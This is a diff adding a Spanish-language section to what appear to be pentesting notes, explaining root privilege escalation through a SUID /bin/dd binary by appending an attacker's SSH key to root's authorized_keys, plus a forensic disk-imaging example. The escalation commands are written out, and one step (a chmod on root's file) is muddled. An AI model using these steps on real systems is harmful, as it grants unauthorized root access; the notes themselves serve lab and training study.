@@ -231,6 +231,52 @@ Existen 2 versiones de este servicio
 ike-scan -M --ikev2 10.10.10.116
 ```
 
+## Priv escalation con /bin/dd SUID
+
+Pero si tienes este con permisos SUID te permite escribir lo que sea porque es muy poderso.
+
+El comando dd tiene una sintaxis que se basa en operandos del tipo keyword=value. Aquí hay algunos de los operandos más comunes:
+
+if= especifica el archivo de entrada (Input File).
+
+of= especifica el archivo de salida (Output File).
+
+bs= especifica el tamaño del bloque en bytes.
+
+count= número de bloques a copiar.
+
+skip= número de bloques a saltar en el archivo de entrada.
+
+seek= número de bloques a saltar en el archivo de salida.
+
+sabiendo esto entonces podemos escribir la authorized_keys de root y conectarnos como root.
+
+```
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." > /tmp/mykey.pub
+
+# Tiene que estar con estos permisos o no te va a dejar ahcer nada
+chmod 600 /root/.ssh/authorized_keys
+
+/bin/dd if=/tmp/mykey.pub of=/root/.ssh/authorized_keys oflag=append conv=notrunc
+
+
+Verifica si si se escribio esto solo va a leer el contenido
+
+/bin/dd if=/root/.ssh/authorized_keys
+
+```
+
+
+En el ámbito forense, dd se utiliza para crear imágenes bit a bit de dispositivos de almacenamiento. Esto es crucial para la preservación de evidencia digital en un estado prístino, ya que permite a los investigadores trabajar con una copia exacta del dispositivo sin alterar el original. Este proceso captura todos los datos del dispositivo, incluidos los archivos borrados y los espacios no asignados, que pueden contener información valiosa para la investigación.
+
+```
+dd if=/dev/sda of=/path/to/image.img bs=4M
+
+#Block Size (bs): Define el tamaño de cada bloque de datos que se lee y luego se escribe en una sola operación. En el ejemplo bs=4M, se indica que dd debe leer y escribir datos en bloques de 4 megabytes cada uno.
+
+
+```
+
 ## Palabras clave
 
 Algunas palabras clave al momento de buscar exploits
